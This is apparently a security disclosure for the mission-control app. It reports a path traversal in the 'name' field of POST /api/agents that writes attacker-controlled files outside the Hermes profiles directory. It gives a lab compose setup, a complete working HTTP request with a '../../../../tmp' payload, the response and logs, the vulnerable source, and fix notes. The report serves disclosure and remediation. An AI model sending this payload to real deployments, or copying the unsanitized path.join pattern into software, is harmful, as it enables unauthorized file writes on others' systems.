### Vulnerability details

**Official website / Product:** https://github.com/builderz-labs/mission-control

**Repository:** builderz-labs/mission-control (stars at selection: 6430)

**Vulnerability type:** file_upload (arbitrary file write / path traversal)

**Vulnerability versions:** 2.3.0 (ghcr.io/builderz-labs/mission-control:latest @ sha256:31a31ed870656f5a1c21c6ab00ab8a9df3764f1955940c2f3e87400ff6744721); source sink present on main @ c1a846fe020567bb3ceb3b65db9f00db875618cd

**Vulnerability URL / Parameter:** `POST /api/agents` — JSON fields `runtime_type=hermes`, `name` (path traversal), `soul_content` (attacker file body)

**Complex:** yes

### Verification procedure

1. Start the stock image (campaign path `labs/mc-r78-a2/`; full compose below):
   ```bash
   docker compose -f labs/mc-r78-a2/docker-compose.yml up -d
   ```
   Image `ghcr.io/builderz-labs/mission-control:latest` (digest `sha256:31a31ed870656f5a1c21c6ab00ab8a9df3764f1955940c2f3e87400ff6744721`, app version 2.3.0); container name `mc-r78-a2`; host port **25802** → container `3000`. Compose seeds: `AUTH_USER=admin`, `AUTH_PASS=R78a2-Audit-Passw0rd!`, `API_KEY=r78a2apikey0123456789abcdef0123456789abcdef0123456789ab`; stock posture `read_only: true` + tmpfs `/tmp` + volume `/app/.data`.
2. Authenticate with header `x-api-key: r78a2apikey0123456789abcdef0123456789abcdef0123456789ab` (global API key maps to admin); browser login `admin` / `R78a2-Audit-Passw0rd!` also works.
3. `POST /api/agents` with `runtime_type:"hermes"` and `name:"../../../../tmp/r78a2-poc-final"` plus attacker-controlled `soul_content` (full request below).
4. Observe HTTP 201 and confirm files written outside `~/.hermes/profiles`:
   ```bash
   docker exec mc-r78-a2 cat /tmp/r78a2-poc-final/SOUL.md
   docker exec mc-r78-a2 cat /tmp/r78a2-poc-final/config.yaml
   docker exec mc-r78-a2 ls -la /tmp/r78a2-poc-final
   ```
   Expected output:
   ```
   R78A2-POC-FINAL-MARKER
   attacker-controlled SOUL.md content
   ---
   model: claude-sonnet-4-6
   provider: anthropic
   toolsets:
   - all
   max_turns: 100
   ---
   total 8
   drwxr-xr-x 2 nextjs nogroup 80 Nov  2 21:54 .
   drwxrwxrwt 4 root   root    80 Nov  2 21:54 ..
   -rw-r--r-- 1 nextjs nogroup 59 Nov  2 21:54 SOUL.md
   -rw-r--r-- 1 nextjs nogroup 76 Nov  2 21:54 config.yaml
   ```
5. Same pattern writes under durable volume when `name` is `../../../../app/.data/r78a2-hermes-escape` (server log: `profileDir":"/app/.data/r78a2-hermes-escape"`).

Compose reference (`labs/mc-r78-a2/docker-compose.yml`):

```yaml
services:
  mission-control:
    image: ghcr.io/builderz-labs/mission-control:latest
    container_name: mc-r78-a2
    ports:
      - "25802:3000"
    environment:
      - PORT=3000
      - AUTH_USER=admin
      - AUTH_PASS=R78a2-Audit-Passw0rd!
      - API_KEY=r78a2apikey0123456789abcdef0123456789abcdef0123456789ab
      - MC_ALLOW_ANY_HOST=1
      - NEXT_PUBLIC_GATEWAY_OPTIONAL=true
      - MISSION_CONTROL_TEST_MODE=0
    volumes:
      - mc-data:/app/.data
    # Match stock compose security posture for realism; /tmp tmpfs needed for AFW proof
    read_only: true
    tmpfs:
      - /tmp
      - /app/.next/cache
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    security_opt:
      - no-new-privileges:true
    restart: unless-stopped

volumes:
  mc-data:
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /api/agents HTTP/1.1
Host: 127.0.0.1:25802
User-Agent: r78-a2-poc/1.0
Accept: application/json
Content-Type: application/json
x-api-key: r78a2apikey0123456789abcdef0123456789abcdef0123456789ab
Content-Length: 246
Connection: close

{"name":"../../../../tmp/r78a2-poc-final","role":"researcher","runtime_type":"hermes","status":"offline","soul_content":"R78A2-POC-FINAL-MARKER\nattacker-controlled SOUL.md content\n","config":{"model":"claude-sonnet-4-6","provider":"anthropic"}}
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 201 Created
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
content-security-policy: default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; script-src 'self' 'nonce-cM9hWDKRy3Uhc71NvbVsVg==' 'strict-dynamic' blob:; style-src 'self' 'unsafe-inline'; style-src-elem 'self' 'unsafe-inline'; style-src-attr 'unsafe-inline'; connect-src 'self' ws: wss: http://127.0.0.1:* http://localhost:* https://cdn.jsdelivr.net; img-src 'self' data: blob:; font-src 'self' data:; frame-src 'self'; worker-src 'self' blob:
x-request-id: 350d3bd3-94f7-4301-8fb4-8fa4505164ee
vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch
content-type: application/json
Date: Mon, 02 Nov 2026 21:54:51 GMT
Connection: close
Content-Length: 639

{"agent":{"id":4,"name":"../../../../tmp/r78a2-poc-final","role":"researcher","session_key":null,"soul_content":"R78A2-POC-FINAL-MARKER\nattacker-controlled SOUL.md content\n","status":"offline","last_seen":null,"last_activity":null,"created_at":1793656491,"updated_at":1793656491,"config":{"model":"claude-sonnet-4-6","provider":"anthropic"},"workspace_id":1,"source":"manual","content_hash":null,"workspace_path":null,"hidden":0,"working_memory":"","runtime_type":"hermes","claude_base_session_id":null,"claude_base_session_created_at":null,"taskStats":{"total":0,"assigned":0,"in_progress":0,"quality_review":0,"done":0,"completed":0}}}
```

Verification result notes:

- HTTP 201 Created; agent stored with traversal name intact.
- In-container `/tmp/r78a2-poc-final/SOUL.md` and `config.yaml` contents (measured):
  ```
  ---SOUL---
  R78A2-POC-FINAL-MARKER
  attacker-controlled SOUL.md content
  ---CFG---
  model: claude-sonnet-4-6
  provider: anthropic
  toolsets:
  - all
  max_turns: 100
  ```
- Server logs (`Provisioned Hermes profile directory`; escaped intended `$HOME/.hermes/profiles`):
  ```
  {"level":30,"time":1793656491856,"pid":1,"hostname":"5e9599121893","agentName":"../../../../tmp/r78a2-poc-final","profileDir":"/tmp/r78a2-poc-final","msg":"Provisioned Hermes profile directory"}
  {"level":30,"time":1793656434682,"pid":1,"hostname":"5e9599121893","agentName":"../../../../app/.data/r78a2-hermes-escape","profileDir":"/app/.data/r78a2-hermes-escape","msg":"Provisioned Hermes profile directory"}
  ```
- Stock compose uses `read_only: true` + tmpfs `/tmp` — write still succeeds (no custom handlers).

### Vulnerability analysis

When `runtime_type === 'hermes'`, `POST /api/agents` provisions a Hermes profile via:

`path.join(appConfig.homeDir, '.hermes', 'profiles', name)`

The `name` field is validated only as `z.string().min(1).max(100)` — unlike `openclaw_id`, it is **not** restricted to kebab-case / safe path segments. Node `path.join` normalizes `../` segments, so a name such as `../../../../tmp/r78a2-poc-final` resolves to `/tmp/r78a2-poc-final` (container `HOME=/nonexistent`). The handler then `mkdirSync(..., { recursive: true })` and `writeFileSync` of `config.yaml` plus attacker-controlled `SOUL.md` (`soul_content`). This is arbitrary file write of attacker content to an unexpected path (campaign `file_upload` definition), not symlink-only.

Trigger / sink source (full path and line numbers):

```typescript
# File: src/app/api/agents/route.ts
# Lines: 278-295
# Provision Hermes profile directory if runtime_type is hermes
if (runtime_type === 'hermes') {
  try {
    const { mkdirSync, writeFileSync, existsSync: fsExists } = require('node:fs')
    const profileDir = path.join(appConfig.homeDir, '.hermes', 'profiles', name)
    if (!fsExists(profileDir)) {
      mkdirSync(profileDir, { recursive: true })
      const model = finalConfig.model || 'claude-sonnet-4-6'
      const provider = finalConfig.provider || 'anthropic'
      writeFileSync(
        path.join(profileDir, 'config.yaml'),
        `model: ${model}\nprovider: ${provider}\ntoolsets:\n- all\nmax_turns: 100\n`,
      )
      if (soul_content) {
        writeFileSync(path.join(profileDir, 'SOUL.md'), soul_content)
      }
    }
  } catch (err) { /* non-fatal */ }
}
```

Validation gap: `src/lib/validation.ts` lines 106-120 — `createAgentSchema.name` has no path-segment restriction (unlike `openclaw_id`).

### Fix notes

- Sanitize agent `name` used in filesystem paths: reject `..`, `/`, `\\`, NUL; or use a separate sanitized profile id (same rules as `openclaw_id`).
- Resolve the profile directory with `resolveWithin(hermesProfilesRoot, safeName)` after creating the profiles root.
- Refuse absolute names and enforce realpath containment before write.
